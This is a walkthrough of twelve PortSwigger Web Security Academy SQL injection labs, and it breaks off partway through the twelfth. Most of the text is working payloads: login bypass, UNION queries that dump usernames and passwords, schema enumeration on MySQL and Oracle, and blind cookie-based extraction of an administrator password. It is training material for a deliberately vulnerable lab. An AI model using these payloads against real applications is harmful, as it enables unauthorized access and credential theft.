01 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
================================================================================

This lab contains a SQL injection vulnerability in the product category filter.
When the user selects a category, the application carries out a SQL query like
the following:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

To solve the lab, perform a SQL injection atta

Reference: https://portswigger.net/web-security/sql-injection

When the buttons are clicked it is filtered by category:

![img](media/b0d2066d19667f0ceedf510d3ca83f58.png)

This is done with a GET request:

![img](media/f4beb5fba41f39744f49db5f3cd2c185.png)

Using the following payload we get 4 items instead of only 3, because it shows
both the released and the hidden one:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'-- 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/faa0c918046d4d3bae2234182dfb5198.png)

To show all values we add OR 1=1 to display all categories:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'+OR+1=1--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/a58b6956cbc1e494280ef6e8f2a1db1d.png)

02 SQL injection vulnerability allowing login bypass
====================================================

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application
as the administrator user.

Reference: https://portswigger.net/web-security/sql-injection

The login functionality works with a POST request:

![img](media/3ceea574a17c74f44c9b0f0071b17c33.png)

Using the following payload in the password field it is possible to login:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'+or'1'='1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/3f7af7c8a166b0fa65af8a4e252e4cbe.png)

03 SQL injection UNION attack, determining the number of columns returned by the query
======================================================================================

This lab contains a SQL injection vulnerability in the product category filter.
The results from the query are returned in the application's response, so you
can use a UNION attack to retrieve data from other tables. The first step of
such an attack is to determine the number of columns that are being returned by
the query. You will then use this technique in subsequent labs to construct the
full attack.

To solve the lab, determine the number of columns returned by the query by
performing a SQL injection UNION attack that returns an additional row
containing null values.

Reference: https://portswigger.net/web-security/sql-injection/union-attacks

We see there are 2 values displayed in the table, the name and the price of the
products:

![img](media/c700bc808511b5be9a985ec85e0f0c27.png)

The following payload is accepted and we see the 4 items from Accessories
category:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Accessories'--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/6b897f8ad553394634a37f96db45b25c.png)

The same happens with this payload, to display all values:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Accessories'+or+1=1--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We will update the payload to execute a UNION attack and find the query takes 3
parameters and not 2:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Accessories'+union+select+NULL,NULL,NULL--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/b3345f0a6dafdc76cf65b40489b6d292.png)

We can also add values instead of using NULL:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Accessories'+union+all+select+'0','1','2'--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/0d2c7db7600c04d41fe1d170b5771849.png)

04 SQL injection UNION attack, finding a column containing text
===============================================================

This lab contains a SQL injection vulnerability in the product category filter.
The results from the query are returned in the application's response, so you
can use a UNION attack to retrieve data from other tables. To construct such an
attack, you first need to determine the number of columns returned by the query.
You can do this using a technique you learned in a previous lab. The next step
is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the
query results. To solve the lab, perform a SQL injection UNION attack that
returns an additional row containing the value provided. This technique helps
you determine which columns are compatible with string data.

Reference: https://portswigger.net/web-security/sql-injection/union-attacks

We see there are 2 values displayed in the table, the name and the price of the
products:

![img](media/cae1ff6926ef22225f3619cda31720b7.png)

We find these payload are valid to display the 4 items in Accessories and all
the items:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Accessories'--
/filter?category=Accessories'+or+1=1--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Also, that there are 3 columns returned by the query and we can do a UNION
attack with:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Accessories'+union+all+select+NULL,NULL,NULL--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We can print the string Qrc0Pq setting this string in the second value of the
attack:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Accessories'+union+all+select+'0','Qrc0Pq','1234'--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/f2bcf86e1a58dfe9f0db7251dc83bd80.png)

05 SQL injection UNION attack, retrieving data from other tables
================================================================

This lab contains a SQL injection vulnerability in the product category filter.
The results from the query are returned in the application's response, so you
can use a UNION attack to retrieve data from other tables. To construct such an
attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called
username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all
usernames and passwords, and use the information to log in as the administrator
user.

Reference: https://portswigger.net/web-security/sql-injection/union-attacks

We see there are 2 values displayed in the table, the description and the
content of the post:

![img](media/fafa206bac694152b7c456e4643bddec.png)

We find these payload are valid to display the 4 posts in Gifts and the second
all the items:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'--
/filter?category=Gifts'+or+1=1--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Also, that there are 2 columns returned by the query and we can do a UNION
attack with:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'+union+all+select+NULL,NULL--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/b548c4991bb651341027e16ee57196ab.png)

Knowing the table and database names we can retrieve the content from users
using the payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'+union+all+select+username,password+from+users--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/c74c433d4c17d766574b5cf8244a596f.png)

06 SQL injection UNION attack, retrieving multiple values in a single column
============================================================================

This lab contains a SQL injection vulnerability in the product category filter.
The results from the query are returned in the application's response so you can
use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called
username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all
usernames and passwords, and use the information to log in as the administrator
user.

Hint: You can find some useful payloads on our SQL injection cheat sheet.

References:

-   https://portswigger.net/web-security/sql-injection/union-attacks

-   https://portswigger.net/web-security/sql-injection/cheat-sheet

We see there is 1 value displayed in the table, the name of the product:

![img](media/623f3e13577990b4cfd4fa619172866d.png)

We find these payload are valid to display the 4 items in Gifts and the second
all the items:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'--
/filter?category=Gifts'+or+1=1--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Also, that there are 2 columns returned by the query and we can do a UNION
attack with:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'+union+all+select+NULL,NULL--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/93fdd0417de32a2ebdd44e4f24ccce23.png)

We can print strings using the second column in the attack and concatenate
strings using CONCAT:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'+union+all+select+NULL,CONCAT('foo','bar')--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/a0039f52e78bdca08da796368a36ab0a.png)

We can get content from both columns using SELECT CONCAT(username,':',password)
from users:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'+union+all+select+NULL,CONCAT(username,':',password)+from+users--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/2b0a30e2b23c907976ef73e3bcce6e1b.png)

07 SQL injection attack, querying the database type and version on Oracle
=========================================================================

This lab contains a SQL injection vulnerability in the product category filter.
You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

Hint: On Oracle databases, every SELECT statement must specify a table to select
FROM. If your UNION SELECT attack does not query from a table, you will still
need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this
purpose. For example: UNION SELECT 'abc' FROM dual

References:

-   https://portswigger.net/web-security/sql-injection/examining-the-database

-   https://portswigger.net/web-security/sql-injection/cheat-sheet

We see there are 2 values displayed in the table, the description and the
content of the post:

![img](media/591a71750993add7f9f72fb524438d2d.png)

We find these payload are valid to display the 4 posts in Gifts and the second
all the items:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'--
/filter?category=Gifts'+or+1=1--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Also, that there are 2 columns returned by the query and we can do a UNION
attack with the payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'+union+all+select+NULL,NULL+FROM+dual-- 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We are adding the “FROM dual” because it is necessary in Oracle.

To display the version we need to execute one of these:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SELECT banner FROM v$version
SELECT version FROM v$instance
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'+union+all+select+'1',banner+FROM+v$version-- 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/ab624ee5f035e5bf01871000dad8c44c.png)

With v\$instance the server returns an error message.

08 - SQL injection attack, querying the database type and version on MySQL and Microsoft
========================================================================================

This lab contains a SQL injection vulnerability in the product category filter.
You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. (Make the database
retrieve the string: '8.0.32-0ubuntu0.20.04.2')

Reference: https://portswigger.net/web-security/sql-injection/cheat-sheet

Generated link:
https://0aab0018030112cfc1c781f9007c009c.web-security-academy.net/

Filtering using GET parameter “category”: "/filter?category=Accesories"

/filter?category=Accesories -\> Return 4 items

/filter?category=Accessories';\# -\> Return 4 items, the query is finished

/filter?category=Accessories'+and+'1'='1 -\> Return 4 items

/filter?category=Accessories'+and+'1'='0 -\> Return 0 items

/filter?category=Accessories'+union+select+0,\@\@version;\# -\> Print version

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /filter?category=Accessories'+union+select+0,@@version;# HTTP/2
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/d73f7c2bf420a4a86d4f12af288688ee.png)

09 SQL injection attack, listing the database contents on non-Oracle databases
==============================================================================

This lab contains a SQL injection vulnerability in the product category filter.
The results from the query are returned in the application's response so you can
use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that
holds usernames and passwords. You need to determine the name of this table and
the columns it contains, then retrieve the contents of the table to obtain the
username and password of all users.

To solve the lab, log in as the administrator user.

References:

-   https://portswigger.net/web-security/sql-injection/examining-the-database

-   https://portswigger.net/web-security/sql-injection/cheat-sheet

We see there are 2 values displayed in the table, the description and the
content of the post:

![img](media/04091c0cd00f6a9395d0e0c421fb8f33.png)

We find these payload are valid to display the 4 posts in Gifts and the second
all the items:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'--
/filter?category=Gifts'+or+1=1--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Also, that there are 2 columns returned by the query and we can do a UNION
attack with the payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'+union+all+select+NULL,NULL-- 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We can get the table names listing TABLE_NAME from information_schema.tables:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'+union+all+select+'1',TABLE_NAME+from+information_schema.tables--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/1dad76809c888b08eed7b494a4104352.png)

Next list the columns in the table “users_vptjgu” with something like:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SELECT * FROM information_schema.columns WHERE table_name = 'users_vptjgu'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'+union+all+select+'1',COLUMN_NAME+from+information_schema.columns+WHERE+table_name+=+'users_vptjgu'--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We get 2 column names:

![img](media/6c0cce3ae6a0f18c8b441779c13a0104.png)

Next we must show the content of the table:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SELECT username_lvfons,password_femvin FROM users_vptjgu
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Gifts'+union+all+select+username_lvfons,password_femvin+from+users_vptjgu--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/ba0128d4fc15566efab480819bf6e210.png)

10 SQL injection attack, listing the database contents on Oracle
================================================================

This lab contains a SQL injection vulnerability in the product category filter.
The results from the query are returned in the application's response so you can
use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that
holds usernames and passwords. You need to determine the name of this table and
the columns it contains, then retrieve the contents of the table to obtain the
username and password of all users.

To solve the lab, log in as the administrator user.

Hint: On Oracle databases, every SELECT statement must specify a table to select
FROM. If your UNION SELECT attack does not query from a table, you will still
need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this
purpose. For example: UNION SELECT 'abc' FROM dual

References:

-   https://portswigger.net/web-security/sql-injection/examining-the-database

-   https://portswigger.net/web-security/sql-injection/cheat-sheet

We see there are 2 values displayed in the table, the description and the
content of the post:

![img](media/2d409d76d112115525173fba0786e391.png)

We find these payload are valid to display the 4 posts in Gifts and the second
all the items:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Pets'--
/filter?category=Pets'+or+1=1--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Also, that there are 2 columns returned by the query and we can do a UNION
attack with the payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Pets'+union+all+select+NULL,NULL+from+dual--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

List the table names with

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SELECT table_name from all_tables
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Pets'+union+all+select+'1',table_name+from+all_tables--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/a34ef035b6a1aec996bee687c0a03f86.png)

The interesting one seems “USERS_XWRQEE”.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SELECT COLUMN_NAME from all_tab_columns WHERE table_name = 'USERS_XWRQEE'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Pets'+union+all+select+'1',COLUMN_NAME+from+all_tab_columns+WHERE+table_name+=+'USERS_XWRQEE'--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/2cb582cc25be0ce0e2a884e96f2d236e.png)

Finally:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SELECT USERNAME_KIWRQE,PASSWORD_OCABHB from USERS_XWRQEE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/filter?category=Pets'+union+all+select+USERNAME_KIWRQE,PASSWORD_OCABHB+from+USERS_XWRQEE--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/4ddc138c14b5c9bcea389de74f42d71e.png)

11 Blind SQL injection with conditional responses
=================================================

This lab contains a blind SQL injection vulnerability. The application uses a
tracking cookie for analytics, and performs a SQL query containing the value of
the submitted cookie.

The results of the SQL query are not returned, and no error messages are
displayed. But the application includes a "Welcome back" message in the page if
the query returns any rows.

The database contains a different table called users, with columns called
username and password. You need to exploit the blind SQL injection vulnerability
to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

Hint: You can assume that the password only contains lowercase, alphanumeric
characters.

References:

-   https://portswigger.net/web-security/sql-injection/blind

-   https://portswigger.net/web-security/sql-injection/cheat-sheet

There is a SQL injection in the cookie:

![img](media/6e683201057a5eac4148cd097575ca91.png)

The message “Welcome back!” appears with the payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+'1'='1;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/d0eae10992529b3914a9a9bc93fbf327.png)

And it does not appear with:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+'1'='0;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/7b4452c5bca3196030e07ad2635f74ee.png)

To test if the first letter of the password is “s” I will send:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,1)='s
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username='administrator'),1,1)='s
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

I sent it to the intruder and test the length sending all the letters including
“s”:

![img](media/980c3239aff42027bfb12cae0bda93b9.png)

So we know the first letter of the administrator's password is “s” and we can
test the second letter:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,2)='ss
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username='administrator'),1,2)='ss
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/49366e11300c2f7f77851217b8570a36.png)

It is better to update just the number of letter and test only one letter every
time:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),2,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),3,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),4,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),5,1)='a
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

I continued until retrieving the password “ssmyivfjyj5m1bvch02g”.

12 Blind SQL injection with conditional errors
==============================================

This lab contains a blind SQL injection vulnerability. The application uses a
tracking cookie for analytics, and performs a SQL query containing the value of
the submitted cookie.

The results of the SQL query are not returned, and the application does not
respond any differently based on whether the query returns any rows. If the SQL
query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called
username and password. You need to exploit the blind SQL injection vulnerability
to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

Hint: This lab uses an Oracle database. For more information, see the SQL
injection cheat sheet.

References:

-   https://portswigger.net/web-security/sql-injection/blind

-   https://portswigger.net/web-security/sql-injection/cheat-sheet

There is a SQL injection in the cookie. First we find we do not get errors with
the payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
COOKIE'+and'1'='1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Cookie: TrackingId=9HCLCYU9VeK78knn'+and'1'='1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/2e99c846df62a5b6cec2ce4b7f979736.png)

In MySQL it would be:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
COOKIE' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
COOKIE' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

But it is Oracle so we must use:

